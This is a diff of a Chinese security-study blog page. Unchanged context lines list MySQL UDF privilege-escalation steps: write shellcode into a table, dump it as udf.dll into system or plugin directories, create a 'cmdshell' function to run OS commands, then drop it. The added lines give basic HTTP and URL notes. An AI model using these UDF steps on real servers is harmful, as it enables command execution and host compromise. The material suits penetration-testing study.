@@ -341,6 +341,11 @@
 <h4 id="Mysql-UDF提权步骤："><a href="#Mysql-UDF提权步骤：" class="headerlink" title="Mysql UDF提权步骤："></a>Mysql UDF提权步骤：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE TempTable(UDF BLOB); //创建临时表</span><br><span class="line">INSERT INTOTempTableVALUES(CONVERT(shellcode,CHAR)); //插入shellcode</span><br><span class="line">SELECT UDF FROM TempTable INTO DUMPFILE &#x27;C:\Windows\udf.dll&#x27;; //导出UDF.dll</span><br><span class="line">DROP TABLE TempTable; //删除临时表</span><br><span class="line">creat function cmdshell returns string soname &#x27;udf.dll&#x27;; //创建cmdshell函数</span><br><span class="line">select cmdshell(&#x27;command&#x27;); //执行命令</span><br><span class="line">drop function cmdshell; //删除cmdshell命令</span><br></pre></td></tr></table></figure>
 
 <p>注：第二步中需要导入命令执行的shellcode。第三步需要注意Mysql版本，Mysql5.0以上必需导入到系统目录，因为第五步中需要引用udf.dll，而Mysql5.0以上不允许有路径存在，所以Mysql5.0以上的版本一般都会导入到”C:\Windows&quot;目录中。Mysql5.1以上版本，UDF只能导入到Mysql安装目录下的lib\plugin目录中。</p>
+<h4 id="HTTP基础知识："><a href="#HTTP基础知识：" class="headerlink" title="HTTP基础知识："></a>HTTP基础知识：</h4><p>HTTP协议即超文本传输协议，是一种详细规定了浏览器和万维网服务器之间互相通信的规则，它是万维网交换信息的基础，它允许将HTML文档从WEB服务器传输到WEB浏览器。(应用层的协议)</p>
+<p><strong>http请求：</strong></p>
+<p>URL(统一资源定位符)也被称为网页地址，是互联网标准的地址。</p>
+<p>标准格式：协议://服务器IP[:端口]/路径/[?查询]</p>
+<p>浏览器可以发起HTTP请求，也可以借助其他工具发起HTTP请求，例如，linux系统的curl命令。</p>
 
       
 
